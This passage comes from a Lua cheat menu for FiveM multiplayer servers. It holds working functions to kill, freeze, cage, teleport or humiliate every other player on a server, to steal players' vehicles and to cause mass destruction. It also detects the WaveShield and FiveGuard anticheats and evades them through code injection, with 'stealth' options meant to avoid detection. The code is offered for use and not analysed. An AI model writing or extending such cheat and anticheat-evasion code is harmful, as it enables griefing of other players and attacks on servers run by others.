                                    end)
                                end
                            end},

                            {name = "Force Vehicle Engine", type = "action", onClick = function()
                                if IsPedInAnyVehicle(PlayerPedId(), false) then
                                    local veh = GetVehiclePedIsIn(PlayerPedId(), false)
                                    SetVehicleEngineOn(veh, true, true, false)
                                    SetVehicleEngineHealth(veh, 1000.0)
                                    Menu.Toast("Engine forced on!", "green")
                                end
                            end},

                            {name = "Unlock Closest Vehicle", type = "action", onClick = function()
                                local ped = PlayerPedId()
                                local coords = GetEntityCoords(ped)
                                local veh = GetClosestVehicle(coords.x, coords.y, coords.z, 20.0, 0, 71)
                                if DoesEntityExist(veh) then
                                    SetVehicleDoorsLocked(veh, 1)
                                    Menu.Toast("Vehicle unlocked!", "green")
                                else Menu.Toast("No vehicle nearby!", "red") end
                            end},

                            {name = "Teleport into Closest Vehicle", type = "action", onClick = function()
                                local ped = PlayerPedId()
                                local coords = GetEntityCoords(ped)
                                local veh = GetClosestVehicle(coords.x, coords.y, coords.z, 30.0, 0, 71)
                                if DoesEntityExist(veh) then
                                    SetVehicleDoorsLocked(veh, 1)
                                    for seat = -1, GetVehicleMaxNumberOfPassengers(veh) - 1 do
                                        if IsVehicleSeatFree(veh, seat) then
                                            TaskWarpPedIntoVehicle(ped, veh, seat)
                                            Menu.Toast("Teleported into vehicle!", "green")
                                            return
                                        end
                                    end
                                    Menu.Toast("No free seats!", "yellow")
                                else Menu.Toast("No vehicle nearby!", "red") end
                            end},
                        }
                    },
                }
            },

            {
                name = "EXPLOITS",
                hasTabs = true,
                tabs = {
                    {
                        name = "Combat",
                        items = {
                            {name = "Anti-Headshot", type = "toggle", value = false, onClick = function(state)
                                Menu.AntiHeadshot = state
                                Menu.RegisterFeature("Anti-Headshot", state)
                                if state then
                                    Citizen.CreateThread(function()
                                        while Menu.AntiHeadshot do
                                            SetPedSuffersCriticalHits(PlayerPedId(), false)
                                            Citizen.Wait(1000)
                                        end
                                        SetPedSuffersCriticalHits(PlayerPedId(), true)
                                    end)
                                end
                            end},
                            {name = "Laser Eyes (F)", type = "toggle", value = false, onClick = function(state)
                                Menu.LaserEyesEnabled = state
                                Menu.RegisterFeature("Laser Eyes", state)
                            end},
                            {name = "Super Punch", type = "toggle", value = false, onClick = function(state)
                                Menu.SuperPunchEnabled = state
                                Menu.RegisterFeature("Super Punch", state)
                                if Menu.AnticheatDetected and (Menu.AnticheatDetected.WaveShield or Menu.AnticheatDetected.FiveGuard) then
                                    local s = "SetWeaponDamageModifier(GetHashKey('WEAPON_UNARMED'), " .. (state and "999999.0" or "1.0") .. ")"
                                    if Susano and Susano.InjectResource then pcall(function() Susano.InjectResource("any", s) end)
                                    else SetWeaponDamageModifier(GetHashKey("WEAPON_UNARMED"), state and 999999.0 or 1.0) end
                                else SetWeaponDamageModifier(GetHashKey("WEAPON_UNARMED"), state and 999999.0 or 1.0) end
                            end},
                            {name = "Throw Vehicles", type = "toggle", value = false, onClick = function(state)
                                Menu.ThrowVehiclesEnabled = state
                                Menu.RegisterFeature("Throw Vehicles", state)
                                if state then
                                    Citizen.CreateThread(function()
                                        while Menu.ThrowVehiclesEnabled do
                                            local ped = PlayerPedId()
                                            if IsPedShooting(ped) then
                                                local c = GetGameplayCamCoord()
                                                local r = GetGameplayCamRot(2)
                                                local fv = vector3(
                                                    -math.sin(math.rad(r.z)) * math.cos(math.rad(r.x)),
                                                    math.cos(math.rad(r.z)) * math.cos(math.rad(r.x)),
                                                    math.sin(math.rad(r.x))
                                                )
                                                local modelName = Menu.ThrowVehicleModel or "adder"
                                                local model = GetHashKey(modelName)
                                                RequestModel(model)
                                                local t = 0
                                                while not HasModelLoaded(model) and t < 50 do
                                                    Citizen.Wait(10)
                                                    t = t + 1
                                                end
                                                if HasModelLoaded(model) then
                                                    local spawnC = c + fv * 5.0
                                                    local networked = Menu.ThrowVehicleNetworked or false
                                                    local veh = CreateVehicle(model, spawnC.x, spawnC.y, spawnC.z, 0.0, networked, false)
                                                    if DoesEntityExist(veh) then
                                                        SetEntityNoCollisionEntity(veh, ped, false)
                                                        ApplyForceToEntity(veh, 1, fv.x * 200.0, fv.y * 200.0, fv.z * 200.0, 0, 0, 0, 0, true, true, true, false, true)
                                                        SetEntityAsNoLongerNeeded(veh)
                                                    end
                                                    SetModelAsNoLongerNeeded(model)
                                                end
                                            end
                                            Citizen.Wait(0)
                                        end
                                    end)
                                end
                            end},
                            {name = "Vehicle Ammo Model", type = "selector", selected = 1, options = {"Adder", "Zentorno", "Rhino", "Bulldozer", "Dump", "CargoPlane"}, onClick = function(sel, val)
                                local m = {
                                    ["Adder"] = "adder",
                                    ["Zentorno"] = "zentorno",
                                    ["Rhino"] = "rhino",
                                    ["Bulldozer"] = "bulldozer",
                                    ["Dump"] = "dump",
                                    ["CargoPlane"] = "cargoplane",
                                }
                                Menu.ThrowVehicleModel = m[val] or "adder"
                                Menu.Toast("Ammo set: " .. val, "green")
                            end},
                            {name = "Networked Ammo", type = "toggle", value = false, onClick = function(state)
                                Menu.ThrowVehicleNetworked = state
                                if state then
                                    Menu.Toast("WARNING: Networked ammo can be detected!", "yellow")
                                else
                                    Menu.Toast("Stealth: Client-only ammo (Safe).", "green")
                                end
                            end},

                            {name = "Fire Ammo", type = "toggle", value = false, onClick = function(state)
                                Menu.FireAmmoEnabled = state
                                Menu.RegisterFeature("Fire Ammo", state)
                                if state then
                                    Citizen.CreateThread(function()
                                        while Menu.FireAmmoEnabled do
                                            SetFireAmmoThisFrame(PlayerId())
                                            Citizen.Wait(0)
                                        end
                                    end)
                                end
                            end},

                            {name = "Clone Army", type = "action", onClick = function()
                                local ped = PlayerPedId()
                                local c = GetEntityCoords(ped)
                                Citizen.CreateThread(function()
                                    for i = 1, 10 do
                                        local clone = ClonePed(ped, false, false, true)
                                        local angle = (i / 10) * 360
                                        local rad = math.rad(angle)
                                        SetEntityCoords(clone, c.x + math.cos(rad) * 3, c.y + math.sin(rad) * 3, c.z, false, false, false, true)
                                        local wHash = GetHashKey("WEAPON_CARBINERIFLE")
                                        GiveWeaponToPed(clone, wHash, 999, true, true)
                                        TaskCombatHatedTargetsAroundPed(clone, 100.0, 0)
                                        Citizen.Wait(100)
                                    end
                                    Menu.Toast("10 Clones spawned!", "purple")
                                end)
                            end},

                            {name = "Money Effect", type = "action", onClick = function()
                                local c = GetEntityCoords(PlayerPedId())
                                for i = 1, 30 do
                                    local model = GetHashKey("prop_money_bag_01")
                                    RequestModel(model)
                                    local t = 0
                                    while not HasModelLoaded(model) and t < 50 do Citizen.Wait(10) t = t + 1 end
                                    local obj = CreateObject(model, c.x + math.random(-3,3), c.y + math.random(-3,3), c.z + 2.0, true, true, false)
                                    SetModelAsNoLongerNeeded(model)
                                    ApplyForceToEntity(obj, 1, math.random(-5,5)*1.0, math.random(-5,5)*1.0, math.random(5,15)*1.0, 0, 0, 0, 0, true, true, true, false, true)
                                end
                                Menu.Toast("Money rain!", "green")
                            end},

                            {isSeparator = true, separatorText = "Mass Actions"},

                            {name = "Kill All (Explosion)", type = "action", onClick = function()
                                local myPed = PlayerPedId()
                                local count = 0
                                for _, pid in ipairs(GetActivePlayers()) do
                                    local tp = GetPlayerPed(pid)
                                    if tp ~= myPed and DoesEntityExist(tp) then
                                        local c = GetEntityCoords(tp)
                                        AddOwnedExplosion(myPed, c.x, c.y, c.z, 2, 9999.0, true, false, 1.0)
                                        count = count + 1
                                    end
                                end
                                Menu.Toast("Killed " .. count .. " players", "red")
                            end},

                            {name = "Kill All (Sniper)", type = "action", onClick = function()
                                local myPed = PlayerPedId()
                                local hash = GetHashKey("WEAPON_HEAVYSNIPER")
                                local count = 0
                                for _, pid in ipairs(GetActivePlayers()) do
                                    local tp = GetPlayerPed(pid)
                                    if tp ~= myPed and DoesEntityExist(tp) then
                                        local c = GetEntityCoords(tp)
                                        for i = 1, 30 do
                                            ShootSingleBulletBetweenCoords(c.x, c.y, c.z + 15.0, c.x, c.y, c.z - 0.5, 500, true, hash, myPed, true, false, 5000.0)
                                        end
                                        count = count + 1
                                    end
                                end
                                Menu.Toast("Sniped " .. count .. " players", "red")
                            end},

                            {name = "Kill All (Nuke)", type = "action", onClick = function()
                                local myPed = PlayerPedId()
                                Citizen.CreateThread(function()
                                    for _, pid in ipairs(GetActivePlayers()) do
                                        local tp = GetPlayerPed(pid)
                                        if tp ~= myPed and DoesEntityExist(tp) then
                                            local c = GetEntityCoords(tp)
                                            for r = 1, 5 do
                                                AddOwnedExplosion(myPed, c.x + math.random(-3,3), c.y + math.random(-3,3), c.z, 2, 9999.0, true, false, 5.0)
                                            end
                                            StartScriptFire(c.x, c.y, c.z, 25, true)
                                        end
                                        Citizen.Wait(50)
                                    end
                                    Menu.Toast("NUKED server!", "red")
                                end)
                            end},

                            {name = "Kill All (Silent)", type = "action", onClick = function()
                                local myPed = PlayerPedId()
                                for _, pid in ipairs(GetActivePlayers()) do
                                    local tp = GetPlayerPed(pid)
                                    if tp ~= myPed and DoesEntityExist(tp) then
                                        local c = GetEntityCoords(tp)
                                        AddOwnedExplosion(myPed, c.x, c.y, c.z - 1.0, 4, 9999.0, false, true, 0.0)
                                        local hash = GetHashKey("WEAPON_HEAVYSNIPER")
                                        for i = 1, 10 do
                                            ShootSingleBulletBetweenCoords(c.x, c.y, c.z + 15.0, c.x, c.y, c.z - 1.0, 500, true, hash, myPed, false, false, 5000.0)
                                        end
                                    end
                                end
                                Menu.Toast("Silent kills", "purple")
                            end},


                                                    {name = "TP Behind Nearest", type = "action", onClick = function()
                                local myC = GetEntityCoords(PlayerPedId())
                                local best, bestPed = 999, nil
                                for _, pid in ipairs(GetActivePlayers()) do
                                    local tp = GetPlayerPed(pid)
                                    if tp ~= PlayerPedId() and DoesEntityExist(tp) then
                                        local d = #(myC - GetEntityCoords(tp))
                                        if d < best then best = d; bestPed = tp end
                                    end
                                end
                                if bestPed then
                                    local tc = GetEntityCoords(bestPed)
                                    local h = GetEntityHeading(bestPed)
                                    local behind = vector3(tc.x + math.sin(math.rad(h)) * 3, tc.y - math.cos(math.rad(h)) * 3, tc.z)
                                    SetEntityCoordsNoOffset(PlayerPedId(), behind.x, behind.y, behind.z, false, false, false)
                                    Menu.Toast("TP behind player!", "blue")
                                end
                            end},
                                                    {name = "Steal Vehicle (Nearest)", type = "action", onClick = function()
                                local myC = GetEntityCoords(PlayerPedId())
                                local best, bestVeh = 999, nil
                                for _, pid in ipairs(GetActivePlayers()) do
                                    local tp = GetPlayerPed(pid)
                                    if tp ~= PlayerPedId() and IsPedInAnyVehicle(tp, false) then
                                        local veh = GetVehiclePedIsIn(tp, false)
                                        local d = #(myC - GetEntityCoords(veh))
                                        if d < best then best = d; bestVeh = veh end
                                    end
                                end
                                if bestVeh then
                                    ClearPedTasksImmediately(GetPedInVehicleSeat(bestVeh, -1))
                                    TaskWarpPedIntoVehicle(PlayerPedId(), bestVeh, -1)
                                    Menu.Toast("Vehicle stolen!", "green")
                                end
                            end},
                                                    {name = "Spam Kill (ID)", type = "action", onClick = function()
                                Menu.OpenInput("Spam Kill", "Server ID:", function(input)
                                    local id = tonumber(input)
                                    if not id then return end
                                    local tp = GetPlayerPed(GetPlayerFromServerId(id))
                                    if not DoesEntityExist(tp) then Menu.Toast("Not found", "red") return end
                                    Citizen.CreateThread(function()
                                        local hash = GetHashKey("WEAPON_HEAVYSNIPER")
                                        for i = 1, 20 do
                                            local c = GetEntityCoords(tp)
                                            for j = 1, 10 do
                                                ShootSingleBulletBetweenCoords(c.x, c.y, c.z + 15, c.x, c.y, c.z - 1, 500, true, hash, PlayerPedId(), true, false, 5000.0)
                                            end
                                            AddOwnedExplosion(PlayerPedId(), c.x, c.y, c.z, 2, 9999.0, true, false, 1.0)
                                            Citizen.Wait(1000)
                                        end
                                        Menu.Toast("Spam kill done", "red")
                                    end)
                                end)
                            end},
                                                    {name = "Cage Player (ID)", type = "action", onClick = function()
                                Menu.OpenInput("Cage Player", "Server ID:", function(input)
                                    local id = tonumber(input)
                                    if not id then return end
                                    local tp = GetPlayerPed(GetPlayerFromServerId(id))
                                    if not DoesEntityExist(tp) then Menu.Toast("Not found", "red") return end
                                    local c = GetEntityCoords(tp)
                                    local model = GetHashKey("prop_gold_cont_01")
                                    RequestModel(model)
                                    while not HasModelLoaded(model) do Citizen.Wait(10) end
                                    local obj = CreateObject(model, c.x, c.y, c.z - 1.0, true, true, false)
                                    FreezeEntityPosition(obj, true)
                                    Menu.Toast("Player caged!", "red")
                                end)
                            end},
                                                    {name = "TP All To Me", type = "action", onClick = function()
                                local myC = GetEntityCoords(PlayerPedId())
                                local count = 0
                                for _, pid in ipairs(GetActivePlayers()) do
                                    local tp = GetPlayerPed(pid)
                                    if tp ~= PlayerPedId() and DoesEntityExist(tp) then
                                        SetEntityCoordsNoOffset(tp, myC.x + math.random(-3,3), myC.y + math.random(-3,3), myC.z, false, false, false)
                                        count = count + 1
                                    end
                                end
                                Menu.Toast(count .. " players teleported!", "green")
                            end},
                                                    {name = "Explode All Vehicles", type = "action", onClick = function()
                                local count = 0
                                for _, pid in ipairs(GetActivePlayers()) do
                                    local tp = GetPlayerPed(pid)
                                    if tp ~= PlayerPedId() and IsPedInAnyVehicle(tp, false) then
                                        local veh = GetVehiclePedIsIn(tp, false)
                                        NetworkExplodeVehicle(veh, true, true)
                                        count = count + 1
                                    end
                                end
                                Menu.Toast(count .. " vehicles exploded!", "red")
                            end},

                                                    {name = "Car Rain", type = "action", onClick = function()
                                Citizen.CreateThread(function()
                                    local cars = {"adder", "zentorno", "t20", "osiris", "turismor"}
                                    local c = GetEntityCoords(PlayerPedId())
                                    for i = 1, 15 do
                                        local model = GetHashKey(cars[math.random(1, #cars)])
                                        RequestModel(model)
                                        while not HasModelLoaded(model) do Citizen.Wait(10) end
                                        local veh = CreateVehicle(model, c.x + math.random(-20, 20), c.y + math.random(-20, 20), c.z + 60 + math.random(10, 40), math.random(0, 360) * 1.0, true, false)
                                        SetEntityAsNoLongerNeeded(veh)
                                        SetModelAsNoLongerNeeded(model)
                                        Citizen.Wait(200)
                                    end
                                    Menu.Toast("Cars raining!", "red")
                                end)
                            end},

                                                    {name = "Burn All", type = "action", onClick = function()
                                local count = 0
                                for _, pid in ipairs(GetActivePlayers()) do
                                    local tp = GetPlayerPed(pid)
                                    if tp ~= PlayerPedId() and DoesEntityExist(tp) then
                                        local c = GetEntityCoords(tp)
                                        StartScriptFire(c.x, c.y, c.z, 25, true)
                                        count = count + 1
                                    end
                                end
                                Menu.Toast(count .. " players burning!", "red")
                            end},
                                                    {name = "Freeze All Players", type = "toggle", value = false, onClick = function(state)
                                Menu.FreezeAllEnabled = state
                                Menu.RegisterFeature("Freeze All", state)
                                if state then
                                    Citizen.CreateThread(function()
                                        while Menu.FreezeAllEnabled do
                                            for _, pid in ipairs(GetActivePlayers()) do
                                                local tp = GetPlayerPed(pid)
                                                if tp ~= PlayerPedId() and DoesEntityExist(tp) then
                                                    FreezeEntityPosition(tp, true)
                                                end
                                            end
                                            Citizen.Wait(500)
                                        end
                                        for _, pid in ipairs(GetActivePlayers()) do
                                            local tp = GetPlayerPed(pid)
                                            if DoesEntityExist(tp) then FreezeEntityPosition(tp, false) end
                                        end
                                    end)
                                end
                            end},
                                                    {name = "Clear Screen Effects", type = "action", onClick = function()
                                AnimpostfxStopAll()
                                ClearTimecycleModifier()
                                SetWeatherTypeNow("CLEAR")
                                Menu.Toast("Screen effects cleared!", "green")
                            end},
                                                    {name = "Force Ragdoll", type = "action", onClick = function()
                                SetPedToRagdoll(PlayerPedId(), 3000, 3000, 0, false, false, false)
                                Menu.Toast("Ragdolled!", "yellow")
                            end},
                                                    {name = "Remove Crutch", type = "action", onClick = function()
                                ClearPedTasksImmediately(PlayerPedId())
                                SetPedMove(PlayerPedId(), 1)
                                Menu.Toast("Crutch removed!", "green")
                            end},
                                                    {name = "Clear Tasks (Primary)", type = "action", onClick = function()
                                ClearPedTasks(PlayerPedId())
                                Menu.Toast("Primary tasks cleared!", "green")
                            end},
                                                    {name = "Clear Tasks (Secondary)", type = "action", onClick = function()
                                ClearPedSecondaryTask(PlayerPedId())
                                Menu.Toast("Secondary tasks cleared!", "green")
                            end},
                                                    {name = "Anti-Freeze", type = "toggle", value = false, onClick = function(state)
                                Menu.AntiFreezeEnabled = state
                                Menu.RegisterFeature("Anti-Freeze", state)
                                if state then
                                    Citizen.CreateThread(function()
                                        while Menu.AntiFreezeEnabled do
                                            if IsPedRagdoll(PlayerPedId()) or IsEntityPositionFrozen(PlayerPedId()) then
                                                ClearPedTasksImmediately(PlayerPedId())
                                                FreezeEntityPosition(PlayerPedId(), false)
                                            end
                                            Citizen.Wait(100)
                                        end
                                    end)
                                end
                            end},
                                                    {name = "Force Third Person", type = "toggle", value = false, onClick = function(state)
                                Menu.ForceThirdPerson = state
                                Menu.RegisterFeature("Force Third Person", state)
                                if state then
                                    Citizen.CreateThread(function()
                                        while Menu.ForceThirdPerson do
                                            local view = GetFollowPedCamViewMode()
                                            if view == 4 then SetFollowPedCamViewMode(1) end
                                            Citizen.Wait(100)
                                        end
                                    end)
                                end
                            end},
                                                    {name = "Force Driveby", type = "toggle", value = false, onClick = function(state)
                                Menu.ForceDriveby = state
                                Menu.RegisterFeature("Force Driveby", state)
                                if state then
                                    Citizen.CreateThread(function()
                                        while Menu.ForceDriveby do
                                            if IsPedInAnyVehicle(PlayerPedId(), false) then
                                                SetPlayerCanDoDriveBy(PlayerId(), true)
                                            end
                                            Citizen.Wait(100)
                                        end
                                    end)
                                end
                            end},
                        }
                    },
                    {
                        name = "Chaos",
                        items = {
                            {isSeparator = true, separatorText = "Self Trolling"},
                            {name = "Explode Self", type = "action", onClick = function()
                                local myPed = PlayerPedId()
                                local c = GetEntityCoords(myPed)
                                for i = 1, 5 do
                                    AddOwnedExplosion(myPed, c.x + math.random(-2,2), c.y + math.random(-2,2), c.z, 2, 1000.0, true, false, 3.0)
                                end
                                Menu.Toast("BOOM!", "red")
                            end},
                            {name = "Fake Lag", type = "toggle", value = false, onClick = function(state)
                                Menu.FakeLagEnabled = state
                                Menu.RegisterFeature("Fake Lag", state)
                            end},
                            {name = "Spin", type = "toggle", value = false, onClick = function(state)
                                Menu.SpinEnabled = state
                                Menu.RegisterFeature("Spin", state)
                            end},
                            {isSeparator = true, separatorText = "World Chaos"},
                            {name = "Lightning Storm", type = "action", onClick = function()
                                SetWeatherTypeOvertimePersist("THUNDER", 1.0)
                                Menu.Toast("Lightning Storm!", "yellow")
                            end},

                            {isSeparator = true, separatorText = "Destruction"},

                            {name = "Tornado", type = "toggle", value = false, onClick = function(state)
                                Menu.TornadoEnabled = state
                                Menu.RegisterFeature("Tornado", state)
                                if state then
                                    Citizen.CreateThread(function()
                                        local angle = 0
                                        while Menu.TornadoEnabled do
                                            local c = GetEntityCoords(PlayerPedId())
                                            local radius = 15
                                            for i = 1, 3 do
                                                local a = math.rad(angle + (i * 120))
                                                local px = c.x + math.cos(a) * radius
                                                local py = c.y + math.sin(a) * radius
                                                AddExplosion(px, py, c.z, 7, 2.0, true, true, 0.5, false)
                                            end
                                            local peds = GetGamePool('CPed')
                                            for _, ped in ipairs(peds) do
                                                if ped ~= PlayerPedId() and DoesEntityExist(ped) then
                                                    local pc = GetEntityCoords(ped)
                                                    local dist = #(c - pc)
                                                    if dist < 25 and dist > 2 then
                                                        local dir = c - pc
                                                        SetEntityVelocity(ped, dir.x * 2, dir.y * 2, 15.0)
                                                    end
                                                end
                                            end
                                            angle = (angle + 15) % 360
                                            Citizen.Wait(100)
                                        end
                                    end)
                                end
                            end},

                            {name = "Black Hole", type = "toggle", value = false, onClick = function(state)
                                Menu.BlackHoleEnabled = state
                                Menu.RegisterFeature("Black Hole", state)
                                if state then
                                    Citizen.CreateThread(function()
                                        local center = GetEntityCoords(PlayerPedId())
                                        local myPed = PlayerPedId()
                                        
                                        -- Load particle asset
                                        local ptfxAsset = "core"
                                        RequestNamedPtfxAsset(ptfxAsset)
                                        while not HasNamedPtfxAssetLoaded(ptfxAsset) do
                                            Citizen.Wait(10)
                                        end
                                        
                                        UseParticleFxAssetNextCall(ptfxAsset)
                                        local blackHoleFx = StartParticleFxLoopedAtCoord("ent_amb_smoke_foundry", center.x, center.y, center.z + 3.0, 0.0, 0.0, 0.0, 5.0, false, false, false, false)
                                        
                                        -- Protect player from being killed by objects/explosions
                                        SetEntityInvincible(myPed, true)
                                        
                                        local pullRadius = 150.0
                                        while Menu.BlackHoleEnabled do
                                            myPed = PlayerPedId()
                                            center = GetEntityCoords(myPed)
                                            SetEntityInvincible(myPed, true)
                                            
                                            -- 1. Pull Vehicles
                                            local vehs = GetGamePool('CVehicle')
                                            for _, veh in ipairs(vehs) do
                                                if DoesEntityExist(veh) and not IsPedInVehicle(myPed, veh, false) then
                                                    local vc = GetEntityCoords(veh)
                                                    local dir = center - vc
                                                    local dist = #(vector3(dir.x, dir.y, dir.z))
                                                    
                                                    if dist < pullRadius then
                                                        NetworkRequestControlOfEntity(veh)
                                                        if dist < 6.0 then
                                                            SetVehicleEngineHealth(veh, -4000.0)
                                                            ExplodeVehicle(veh, true, false)
                                                        else
                                                            local dirNorm = dir / dist
                                                            local pullForce = (pullRadius - dist) * 0.5
                                                            local orbitDir = vector3(-dirNorm.y, dirNorm.x, 0.0)
                                                            local orbitForce = 15.0
                                                            local zForce = (center.z + 3.0 - vc.z) * 2.5
                                                            
                                                            local vel = (dirNorm * pullForce) + (orbitDir * orbitForce) + vector3(0.0, 0.0, zForce)
                                                            SetEntityVelocity(veh, vel.x, vel.y, vel.z)
                                                        end
                                                    end
                                                end
                                            end
                                            
                                            -- 2. Pull Peds
                                            local peds = GetGamePool('CPed')
                                            for _, ped in ipairs(peds) do
                                                if DoesEntityExist(ped) and ped ~= myPed then
                                                    local pc = GetEntityCoords(ped)
                                                    local dir = center - pc
                                                    local dist = #(vector3(dir.x, dir.y, dir.z))
                                                    
                                                    if dist < pullRadius then
                                                        NetworkRequestControlOfEntity(ped)
                                                        SetPedToRagdoll(ped, 1000, 1000, 0, false, false, false)
                                                        
                                                        if dist < 6.0 then
                                                            ApplyDamageToPed(ped, 50, true)
                                                        else
                                                            local dirNorm = dir / dist
                                                            local pullForce = (pullRadius - dist) * 0.4
                                                            local orbitDir = vector3(-dirNorm.y, dirNorm.x, 0.0)
                                                            local orbitForce = 18.0
                                                            local zForce = (center.z + 3.0 - pc.z) * 2.5
                                                            
                                                            local vel = (dirNorm * pullForce) + (orbitDir * orbitForce) + vector3(0.0, 0.0, zForce)
                                                            SetEntityVelocity(ped, vel.x, vel.y, vel.z)
                                                        end
                                                    end
                                                end
                                            end
                                            
                                            -- 3. Pull Props/Objects
                                            local objects = GetGamePool('CObject')
                                            for _, obj in ipairs(objects) do
                                                if DoesEntityExist(obj) then
                                                    local oc = GetEntityCoords(obj)
                                                    local dir = center - oc
                                                    local dist = #(vector3(dir.x, dir.y, dir.z))
                                                    
                                                    if dist < pullRadius then
                                                        NetworkRequestControlOfEntity(obj)
                                                        if dist < 6.0 then
                                                            DeleteEntity(obj)
                                                        else
                                                            local dirNorm = dir / dist
                                                            local pullForce = (pullRadius - dist) * 0.5
                                                            local orbitDir = vector3(-dirNorm.y, dirNorm.x, 0.0)
                                                            local orbitForce = 12.0
                                                            local zForce = (center.z + 3.0 - oc.z) * 2.5
                                                            
                                                            local vel = (dirNorm * pullForce) + (orbitDir * orbitForce) + vector3(0.0, 0.0, zForce)
                                                            SetEntityVelocity(obj, vel.x, vel.y, vel.z)
                                                        end
                                                    end
                                                end
                                            end
                                            
                                            Citizen.Wait(40)
                                        end
                                        
                                        -- Stop Particle Effect
                                        if blackHoleFx then
                                            StopParticleFxLooped(blackHoleFx, false)
                                        end
                                        
                                        -- Remove invincibility if general godmode is off
                                        if not Menu.GodModeEnabled then
                                            SetEntityInvincible(PlayerPedId(), false)
                                        end
                                        
                                        -- Trigger massive shockwave explosion when disabled!
                                        AddExplosion(center.x, center.y, center.z + 3.0, 59, 999.0, true, false, 5.0)
                                    end)
                                end
                            end},



                            {name = "Earthquake Loop", type = "toggle", value = false, onClick = function(state)
                                Menu.EarthquakeLoopEnabled = state
                                Menu.RegisterFeature("Earthquake Loop", state)
                                if state then
                                    Citizen.CreateThread(function()
                                        while Menu.EarthquakeLoopEnabled do
                                            ShakeGameplayCam("ROAD_VIBRATION_SHAKE", 3.0)
                                            local vehs = GetGamePool('CVehicle')
                                            for _, veh in ipairs(vehs) do
                                                if DoesEntityExist(veh) then
                                                    ApplyForceToEntity(veh, 1, math.random(-5,5)*1.0, math.random(-5,5)*1.0, math.random(8,20)*1.0, 0, 0, 0, 0, true, true, true, false, true)
                                                end
                                            end
                                            local peds = GetGamePool('CPed')
                                            for _, ped in ipairs(peds) do
                                                if ped ~= PlayerPedId() and DoesEntityExist(ped) then
                                                    SetPedToRagdoll(ped, 2000, 2000, 0, false, false, false)
                                                end
                                            end
                                            Citizen.Wait(500)
                                        end
                                        StopGameplayCamShaking(true)
                                    end)
                                end
                            end},

                            {name = "Carpet Bomb", type = "action", onClick = function()
                                Citizen.CreateThread(function()
                                    local c = GetEntityCoords(PlayerPedId())
                                    local h = GetEntityHeading(PlayerPedId())
                                    local fv = vector3(-math.sin(math.rad(h)), math.cos(math.rad(h)), 0)
                                    SetEntityInvincible(PlayerPedId(), true)
                                    for i = 1, 40 do
                                        local px = c.x + fv.x * i * 5
                                        local py = c.y + fv.y * i * 5
                                        AddOwnedExplosion(PlayerPedId(), px, py, c.z, 2, 50.0, true, false, 3.0)
                                        AddOwnedExplosion(PlayerPedId(), px + 3, py + 3, c.z, 2, 50.0, true, false, 3.0)
                                        AddOwnedExplosion(PlayerPedId(), px - 3, py - 3, c.z, 2, 50.0, true, false, 3.0)
                                        Citizen.Wait(80)
                                    end
                                    SetEntityInvincible(PlayerPedId(), false)
                                    Menu.Toast("Carpet bombed!", "red")
                                end)
                            end},

                            {name = "EMP Blast", type = "action", onClick = function()
                                local c = GetEntityCoords(PlayerPedId())
                                local vehs = GetGamePool('CVehicle')
                                local count = 0
                                for _, veh in ipairs(vehs) do
                                    if DoesEntityExist(veh) then
                                        local vc = GetEntityCoords(veh)
                                        if #(c - vc) < 100 then
                                            NetworkRequestControlOfEntity(veh)
                                            SetVehicleEngineOn(veh, false, true, true)
                                            SetVehicleUndriveable(veh, true)
                                            SetVehicleLights(veh, 1)
                                            count = count + 1
                                        end
                                    end
                                end
                                StartScreenEffect("CamPushInFranklin", 2000, false)
                                Menu.Toast(count .. " vehicles disabled!", "purple")
                            end},

                            {name = "Tank Rain", type = "action", onClick = function()
                                Citizen.CreateThread(function()
                                    local c = GetEntityCoords(PlayerPedId())
                                    local model = GetHashKey("rhino")
                                    RequestModel(model)
                                    while not HasModelLoaded(model) do Citizen.Wait(10) end
                                    for i = 1, 10 do
                                        local veh = CreateVehicle(model, c.x + math.random(-30,30), c.y + math.random(-30,30), c.z + 80 + math.random(20,60), math.random(0,360)*1.0, true, false)
                                        SetEntityAsNoLongerNeeded(veh)
                                        Citizen.Wait(300)
                                    end
                                    SetModelAsNoLongerNeeded(model)
                                    Menu.Toast("10 Tanks falling!", "red")
                                end)
                            end},



                            {isSeparator = true, separatorText = "Mass Chaos"},



                            {name = "Ragdoll All", type = "action", onClick = function()
                                local peds = GetGamePool('CPed')
                                for _, ped in ipairs(peds) do
                                    if ped ~= PlayerPedId() and DoesEntityExist(ped) then
                                        SetPedToRagdoll(ped, 10000, 10000, 0, false, false, false)
                                        SetEntityVelocity(ped, math.random(-10,10)*1.0, math.random(-10,10)*1.0, math.random(5,15)*1.0)
                                    end
                                end
                                Menu.Toast("Everyone ragdolled!", "yellow")
                            end},

                            {name = "Dildo All Players", type = "action", onClick = function()
                                Citizen.CreateThread(function()
                                    local mdl = GetHashKey("prop_cs_dildo_01")
                                    RequestModel(mdl)
                                    while not HasModelLoaded(mdl) do Citizen.Wait(0) end
                                    
                                    local activePlayers = GetActivePlayers()
                                    local count = 0
                                    for _, player in ipairs(activePlayers) do
                                        local ped = GetPlayerPed(player)
                                        if ped and DoesEntityExist(ped) and ped ~= PlayerPedId() then
                                            local coords = GetEntityCoords(ped)
                                            local obj = CreateObject(mdl, coords.x, coords.y, coords.z, true, true, false)
                                            local bone = GetPedBoneIndex(ped, 31086)
                                            AttachEntityToEntity(obj, ped, bone, 0.0, 0.0, 0.2, 90.0, 0.0, 0.0, true, true, false, true, 1, true)
                                            count = count + 1
                                        end
                                    end
                                    SetModelAsNoLongerNeeded(mdl)
                                    local toastMsg = ""
                                    if count == 1 then
                                        toastMsg = "Spawned dildos on 1 player!"
                                    else
                                        toastMsg = "Spawned dildos on " .. count .. " players!"
                                    end
                                    Menu.Toast(toastMsg, "green")
                                end)
                            end},

                            {name = "Flip All Vehicles", type = "action", onClick = function()
                                local vehs = GetGamePool('CVehicle')
                                local count = 0
                                for _, veh in ipairs(vehs) do
                                    if DoesEntityExist(veh) then
                                        NetworkRequestControlOfEntity(veh)
                                        ApplyForceToEntity(veh, 1, 0.0, 0.0, 50.0, 15.0, 0.0, 0.0, 0, true, true, true, false, true)
                                        count = count + 1
                                    end
                                end
                                Menu.Toast(count .. " vehicles flipped!", "red")
                            end},

                            {name = "Bouncy Cars", type = "toggle", value = false, onClick = function(state)
                                Menu.BouncyCarsEnabled = state
                                Menu.RegisterFeature("Bouncy Cars", state)
                                if state then
                                    Citizen.CreateThread(function()
                                        while Menu.BouncyCarsEnabled do
                                            local vehs = GetGamePool('CVehicle')
                                            for _, veh in ipairs(vehs) do
                                                if DoesEntityExist(veh) and IsVehicleOnAllWheels(veh) then
                                                    NetworkRequestControlOfEntity(veh)
